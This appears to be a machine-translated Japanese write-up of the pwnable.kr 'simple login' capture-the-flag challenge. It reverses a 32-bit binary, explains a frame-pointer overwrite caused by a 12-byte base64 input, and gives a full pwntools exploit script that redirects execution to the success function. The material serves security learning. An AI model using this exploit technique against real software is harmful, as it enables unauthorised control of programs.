シンプルなログインジョブソリューション


2番目のセクションを続けます。最初のコードよりも複雑で、アプリケーションのソースコードは提供されていません。ここでの議論を忘れないでください。始めましょう。

シンプルなログインの署名のあるアイコンをクリックします。接続用のアドレスとポート、およびプログラム自体が提供されます。



彼らが私たちに与えるすべてをダウンロードして、バイナリをチェックしてください。



これは、カナリアがインストールされ、実行不可能なスタックを持つ32ビットのエルフです。 IDA Proで逆コンパイルします。



プログラムでは、ユーザーデータはbase64からデコードされます。変数v7には、デコードされた文字列の長さが格納されます。次に、v7が12と比較されます。チェックに合格すると、デコードされた文字列が入力変数にコピーされ、auth関数が呼び出され、デコードされた文字列の長さがパラメーターとして渡されます。そして、認証に合格すると、正しい関数が呼び出されます。 auth関数を見てみましょう。



バッファオーバーフローのように見えます。スタックを見てください。



番号。バッファをオーバーフローさせることはできません。これには12バイト以上必要です。変数の値が格納されているアドレス、特にコピーが実行されるv4変数は興味深いものです。



これはアドレスです[ESP + 32]。このためのコードを逆アセンブルされた形式で見てください。



スタックフレームを保存するには、次の手順が必要です。 スタックを復元するには、leaveステートメントを使用します。逆の操作を実行します。 最も興味深いのは3番目の命令です。 したがって、オーバーラップが発生します。espは40減少し、v2変数はesp + 32にあり、12バイトを使用します。つまり、値をespからebpに移動した後、変数v2の最後の4バイトのアドレスがebpに保存されます。 leave命令とretn命令が実行されると、v2変数の最後の4バイトがスタックの上位フレームに入ります。 入力ラインQUFBQUFBQUFCQkJCをチェックして指定しましょう。 想定が正しければ、auth関数でretnを実行した後、スタックの先頭がアドレス「BBBB」になります。 休暇を実行します。
push ebp
mov ebp, esp




sub esp, 28h















EBPには「BBBB」があり、main関数mainでleaveを実行すると、プログラムがクラッシュします。したがって、スタックの最上位のアドレスの前に、行きたいアドレスが配置されます。次に、ロードは次のようになります。任意の4バイト+移動先のアドレス+ロードの先頭へのアドレス。

まず、テンプレートを作成します。
from pwn import *
from base64 import *

r = remote('pwnable.kr', 9003)
r.recv()

r.interactive()

次に、目的のアドレスを見つけます。これは、正しい関数内の0x8049284です。



このアドレスは、ロードの2番目の部分になります。ロードの3番目の部分は、入力変数のアドレス（ロードアドレス）です。



ロードをコードで構成します。base64でコーディングすることを忘れないでください：
payload = "A"*4 + p32(0x8049284) + p32(0x811EB40)
payload = b64encode(payload)

完全なコード。
from pwn import *
from base64 import *

r = remote('pwnable.kr', 9003)
r.recv()

payload = "A"*4 + p32(0x8049284) + p32(0x811EB40)
payload = b64encode(payload)

r.send(payload+"\n")

r.interactive()
